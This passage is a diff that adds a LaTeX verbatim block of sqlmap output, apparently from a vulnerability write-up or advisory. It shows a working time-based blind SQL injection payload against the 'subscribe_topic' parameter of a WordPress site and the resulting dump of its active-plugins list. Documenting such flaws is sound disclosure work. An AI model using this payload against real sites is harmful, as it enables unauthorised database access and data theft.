@@ -1,0 +1,28 @@
+\begin{verbatim}
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subscribe_topic (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: subscribe_topic=1 AND (SELECT 8926 FROM (SELECT(SLEEP(5)))vMRJ)
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: wordpress
+Table: wp_options
+[1 entry]
++---------------------------------------------------------------------------------+
+| option_value                                                                    |
++---------------------------------------------------------------------------------+
+| a:9:{i:0;s:45:                                                                  |
+| "accordion-slider-gallery/accordion-slider.php";i:1;s:25:                       |
+| "adminimize/adminimize.php";i:2;s:31:                                           |
+| "asgaros-forum/asgaros-forum.php";i:3;s:43:                                     |
+| "download-from-files/download-from-files.php";i:4;s:67:                         |
+| "miniorange-2-factor-authentication/miniorange_2_factor_settings.php";i:5;s:47: |
+| "photo-gallery-builder/photo-gallery-builder.php";i:6;s:29:                     |
+| "pie-register/pie-register.php";i:7;s:45:                                       |
+| "simple-local-avatars/simple-local-avatars.php";i:8;s:38:                       |
+| "timeline-event-history/timeline-wp.php";}                                      |
++---------------------------------------------------------------------------------+
+\end{verbatim}
